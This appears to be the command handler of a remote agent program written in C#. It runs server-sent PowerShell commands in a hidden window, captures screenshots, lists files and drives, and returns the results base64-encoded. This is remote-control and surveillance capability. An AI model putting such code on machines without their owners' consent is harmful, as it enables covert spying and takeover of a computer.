using Libra.Agent.Helper;
using Libra.Agent.Models;
using Libra.Virgo;
using Libra.Virgo.Enum;
using Libra.Virgo.Models.MessageType;
using System;
using System.Buffers.Text;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Text.Json;

namespace Libra.Agent.Handle
{
    internal class CommandHandle
    {
        static CommandModel Packet = new();
        public static async Task Handle(string dataJson)
        {
            if (string.IsNullOrEmpty(dataJson)) return;

            try
            {
                Packet = Newtonsoft.Json.JsonConvert.DeserializeObject<CommandModel>(dataJson);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"解析命令数据失败: {ex.Message}");
                Console.WriteLine($"原始数据: {dataJson}");
                return;
            }

            if (Packet == null) return;

            Console.WriteLine($"收到命令: {Packet.Type}, {string.Join(" ", Packet.Parameter)}");

            switch (Packet.Type)
            {
                case CommandType.Shell:
                    var result = await ExecuteCommandAsync(string.Join(" ", Packet.Parameter));
                    var sendResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result)),
                        EndTime = DateTime.Now
                    });
                    Console.WriteLine($"执行结果: {result.Length}, {sendResult}");
                    break;

                case CommandType.GetFrame:
                    var frame = MonitorHelper.CaptureScreenCompressed((int)(MonitorHelper.GetSystemMetrics(0) / 1.2), (int)(MonitorHelper.GetSystemMetrics(1) / 1.2), 25);
                    var sendframeResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(frame),
                        EndTime = DateTime.Now
                    });
                    Console.WriteLine($"执行结果: {frame.Length},{sendframeResult}");
                    break;

                case CommandType.GetFiles:
                    var files = InfoHelper.Files(Packet.Parameter[0]);
                    var sendfilesResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(files, VirgoJson.Options))),
                        EndTime = DateTime.Now
                    });
                    Console.WriteLine($"执行结果: {files.Length},{sendfilesResult}");
                    break;

                case CommandType.GetDisks:
                    var disks = InfoHelper.Drives();
                    var senddisksResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(disks, VirgoJson.Options))),
                        EndTime = DateTime.Now
                    });
                    Console.WriteLine($"执行结果: {disks.Count},{senddisksResult}");
                    break;


                default:
                    break;
            }
        }

        public static async Task<string> ExecuteCommandAsync(string command)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " + command + "\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using var process = Process.Start(psi);

            string output = await process.StandardOutput.ReadToEndAsync();
            string error = await process.StandardError.ReadToEndAsync();

            await process.WaitForExitAsync();

            return output + error;
        }
    }
}
